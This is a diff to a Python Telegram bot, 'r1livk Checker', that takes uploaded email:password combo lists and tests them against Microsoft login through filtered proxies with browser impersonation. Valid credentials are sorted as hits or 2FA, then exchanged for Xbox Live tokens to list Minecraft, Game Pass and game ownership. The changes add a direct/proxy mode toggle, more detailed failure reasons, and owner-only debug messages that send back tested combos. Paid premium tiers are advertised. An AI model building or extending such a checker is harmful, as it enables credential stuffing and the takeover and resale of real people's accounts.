@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Error Fix)
+r1livk Checker ⚡ - Telegram Bot (Direct / Proxy Switcher Edition)
 """
 
 import os
@@ -25,6 +25,7 @@ STATS_FILE = "user_stats.json"
 
 user_proxies = {}
 user_states = {}
+user_proxy_mode = {} # تتبع هل المستخدم مفعل البروكسي ولا بده مباشر
 
 def load_json_data(filepath, default_val):
     if not os.path.exists(filepath):
@@ -143,7 +144,7 @@ def test_single_proxy(proxy):
         resp = curequests.get("https://login.live.com", proxies=proxies, timeout=5, impersonate="chrome120")
         if resp.status_code == 200:
             ping = int((time.time() - start_t) * 1000)
-            if ping <= 2000: # قبول البروكسي لو البينغ أقل من ثانيتين
+            if ping <= 2000:
                 return True, ping
     except:
         pass
@@ -216,7 +217,6 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
                                     break
                 except:
                     pass
-
     except Exception:
         pass
         
@@ -225,7 +225,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
 def check_single_account(combo, proxy_list=None):
     parts = combo.split(':')
     if len(parts) < 2:
-        return "bad", None
+        return "bad", "Invalid Combo Format"
 
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
@@ -256,7 +256,7 @@ def check_single_account(combo, proxy_list=None):
         url_post = extract_url_post(resp.text)
 
         if not sftag or not url_post:
-            return "bad", None
+            return "error", "Failed to extract PPFT or urlPost (IP Block or Cloudflare)"
 
         login_data = {
             'login': email,
@@ -278,6 +278,9 @@ def check_single_account(combo, proxy_list=None):
 
         if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify"]):
             return "2fa", None
+
+        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email", "password is incorrect"]):
+            return "bad", None
 
         ms_token = None
         full_url = login_req.url
@@ -312,20 +315,18 @@ def check_single_account(combo, proxy_list=None):
                 ms_token = token_match.group(1)
         
         if not ms_token:
-            return "bad", None
+            return "bad", "No Access Token found in response (Likely Bad Password)"
 
-        # احصل على توكن الأكس بوكس بسلامة
         try:
             xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
             xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
             
             if xb_req.status_code != 200:
-                # حتى لو فشل جزء بسيط، الحساب يعتبر شغال طالما جاب توكن الدخول
                 return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Token Verified) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
 
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
-        except:
+        except Exception as e:
             return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Basic Hit) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
 
         gamertag = "N/A"
@@ -372,7 +373,6 @@ def check_single_account(combo, proxy_list=None):
         final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")
 
         has_active_gp = "Active" in final_gp or has_gp_basic
-        has_games = len(owned_games_list) > 0
         
         hit_info = (
             f"{email}:{password}\n"
@@ -384,9 +384,8 @@ def check_single_account(combo, proxy_list=None):
         
         return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": True}
 
-    except Exception:
-        # حتى لو صار أي استثناء بالخطوة الأخيرة، لا تعتبره إيرور مطلقاً إذا تجاوز الباسورد مرحلة التحقق
-        return "bad", None
+    except Exception as e:
+        return "error", str(e)
     finally:
         session.close()
 
@@ -419,10 +418,17 @@ def show_main_menu(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_start = types.InlineKeyboardButton("⚡ Start Heavy Gaming Checker", callback_data="start_checker")
     btn_proxy = types.InlineKeyboardButton("🚀 Upload & Fast-Filter Proxies", callback_data="upload_proxies_menu")
+    
+    # زر تبديل الوضع بين مباشر وبدون بروكسي
+    is_direct = user_proxy_mode.get(chat_id, False)
+    proxy_mode_text = "🌐 Mode: Direct (No Proxy) [Click to Toggle]" if is_direct else "🚀 Mode: Using Proxies [Click to Toggle]"
+    btn_toggle_mode = types.InlineKeyboardButton(proxy_mode_text, callback_data="toggle_proxy_mode")
+
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
-    markup.add(btn_start, btn_proxy, btn_top, btn_premium, btn_account)
+    
+    markup.add(btn_start, btn_proxy, btn_toggle_mode, btn_top, btn_premium, btn_account)
 
     today = str(date.today())
     if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
@@ -432,7 +438,10 @@ def show_main_menu(message):
         status_text = f"👤 Free ({used}/2500 lines today)"
 
     p_count = len(user_proxies.get(chat_id, []))
-    proxy_status = f"🚀 Fast Proxies: {p_count}" if p_count > 0 else "🌐 Proxies: Direct"
+    if is_direct or p_count == 0:
+        proxy_status = "🌐 Status: Direct Connection (No Proxy)"
+    else:
+        proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
         "⚡ **r1livk Checker - Heavy Gaming Edition** ⚡\n\n"
@@ -466,16 +475,27 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "⚠️ You must subscribe to the channel first!", show_alert=True)
         return
 
+    if call.data == "toggle_proxy_mode":
+        current_state = user_proxy_mode.get(chat_id, False)
+        user_proxy_mode[chat_id] = not current_state
+        mode_name = "Direct (No Proxy)" if user_proxy_mode[chat_id] else "Proxy Mode"
+        bot.answer_callback_query(call.id, f"✅ Switched to: {mode_name}", show_alert=False)
+        show_main_menu(call.message)
+        return
+
     if call.data == "start_checker":
         user_states[chat_id] = "combo"
         markup = types.InlineKeyboardMarkup()
         btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
         markup.add(btn_cancel)
 
+        is_direct = user_proxy_mode.get(chat_id, False)
         p_count = len(user_proxies.get(chat_id, []))
+        mode_desc = "🌐 Direct Connection (No Proxy)" if (is_direct or p_count == 0) else f"🚀 Active Proxies: {p_count}"
+        
         text = (
-            "🎮 **Heavy Gaming Mode (Direct & Fast)**\n\n"
-            f"Loaded Fast Proxies: {p_count}\n\n"
+            "🎮 **Heavy Gaming Mode**\n\n"
+            f"Current Mode: {mode_desc}\n\n"
             "Send your combo file in `.txt` format (`email:password`)"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
@@ -534,11 +554,13 @@ def callback_query(call):
     elif call.data == "my_account":
         today = str(date.today())
         p_count = len(user_proxies.get(chat_id, []))
+        is_direct = user_proxy_mode.get(chat_id, False)
+        mode_str = "Direct" if (is_direct or p_count == 0) else f"Proxies ({p_count})"
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nFast Proxies: {p_count}", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nMode: {mode_str}", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nFast Proxies: {p_count}", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nMode: {mode_str}", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -605,6 +627,7 @@ def handle_docs(message):
                     time.sleep(1)
 
             user_proxies[chat_id] = working_proxies
+            user_proxy_mode[chat_id] = False # تفعيل وضع البروكسي تلقائياً بعد رفعه بنجاح
             user_states[chat_id] = "combo"
 
             if os.path.exists(local_path): os.remove(local_path)
@@ -679,19 +702,23 @@ def process_checker(chat_id, filepath, lines, username):
     status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)
 
     lock = threading.Lock()
-    current_user_proxies = user_proxies.get(chat_id, [])
+    
+    # فحص ما إذا كان المستخدم مفعل الوضع المباشر أو لا
+    is_direct = user_proxy_mode.get(chat_id, False)
+    current_user_proxies = [] if is_direct else user_proxies.get(chat_id, [])
 
     def worker(combo):
         nonlocal checked, hits, tfa_count, bad, errors, mc_hits, gp_hits, xbox_hits
         if not active_scans.get(chat_id, True):
             return
 
-        status, data = check_single_account(combo, current_user_proxies)
+        status, error_msg = check_single_account(combo, current_user_proxies)
 
         with lock:
             checked += 1
-            if status == "hit" and data:
+            if status == "hit" and isinstance(error_msg, dict):
                 hits += 1
+                data = error_msg
                 if data["has_mc"]: mc_hits += 1
                 if data["has_gp"]: gp_hits += 1
                 if data["has_xbox"]: xbox_hits += 1
@@ -704,6 +731,11 @@ def process_checker(chat_id, filepath, lines, username):
                 bad += 1
             else:
                 errors += 1
+                if chat_id == OWNER_ID:
+                    try:
+                        bot.send_message(OWNER_ID, f"⚠️ **Debug Error (Owner Only):**\n`{combo}`\nReason: `{error_msg}`", parse_mode="Markdown")
+                    except:
+                        pass
 
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         futures = [executor.submit(worker, line) for line in lines]
@@ -784,5 +816,5 @@ def process_checker(chat_id, filepath, lines, username):
         os.remove(filepath)
 
 if __name__ == "__main__":
-    print("r1livk Checker Bot (Error Fixed Edition) is running...")
+    print("r1livk Checker Bot (Direct/Proxy Switcher Edition) is running...")
     bot.infinity_polling()
